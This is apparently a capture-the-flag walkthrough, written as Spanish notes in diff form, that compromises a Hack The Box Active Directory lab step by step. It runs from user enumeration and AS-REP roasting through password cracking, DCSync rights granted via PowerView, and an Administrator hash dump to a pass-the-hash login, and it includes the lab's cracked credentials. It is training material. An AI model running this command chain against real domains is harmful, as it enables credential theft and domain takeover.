@@ -1,0 +1,36 @@
+1.ping 10.129.27.14
+2.nmap -sS -sV -p- -T4 -vvv 10.129.27.14 -oN ports.txt
+3.enum4linux -U 10.129.27.14 --> Enumeramos usuarios
+        -Creamos un usuario con los usuarios encontrados.
+4.impacket-GetNPUsers HTB.LOCAL/ -usersfile users.txt -dc-ip 10.129.27.14 -no-pass -format hashcat -outputfile asrep.txt --> AA-REP ROAST
+5.hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -->Descraqueamos la password
+        -password: s3rvice
+6.crackmapexec smb 10.129.27.14 -u svc-alfresco -p 's3rvice'
+7.crackmapexec smb 10.129.27.14 -u svc-alfresco -p 's3rvice' --shares
+8.evil-winrm -i <ip> -u 'svc-alfresco' -p 's3rvice'
+        -nos movemos hasta Desktop donde esta la flag en el archivo user.txt
+        -flag: ........................
+9.bloodhound-python -u svc-alfresco -p 'PASSWORD' -d htb.local -ns 10.129.27.14 -c All
+        -Una vez dentro de Bloodhound (http://localhost:8080):
+                ·Search:SVC-Alfresco --> Una vez buscado podemos ver que es miembro de Remote Management Users
+                ·PATHFINDIG: startnode (SVC-ALFRESCO) destinationnode (Domain Admins)
+                        *Crearemos un usuario para poder escalar los privilegios y llegar a administrator
+9.evil-winrm -i <ip> -u 'svc-alfresco' -p 's3rvice'
+        -Creamos el usuario con en Exchange Windows Permissions (Account Operators nos lo permitirá)
+                ·net user user1 'user123' /add /domain
+                ·net group "Exchange Windows Permissions" user1 /add
+
+                                                                                        
+10.Cargamos PowerView.   
+        -locate PowerView.ps1
+        -Dentro del evilwinrm(svc-alfresco) lo cargamos:
+                ·upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
+                · . ./PowerView.ps1
+                ·$pass = ConvertTo-SecureString 'user123' -AsPlainText -Force
+                 $cred = New-Object System.Management.Automation.PSCredential('htb\user1', $pass)
+                 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity user1 -Rights DCSync -Verbose
+11.impacket-secretsdump htb.local/user1:'user123'@10.129.27.14 -just-dc-user Administrator
+        -using the DRSUAPI method to get NTDS.DIT secrets htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+12.evil-winrm -i 10.129.27.14 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+        -Nos movemos hasta la flag que esta en Desktop:
+        -flag:.................
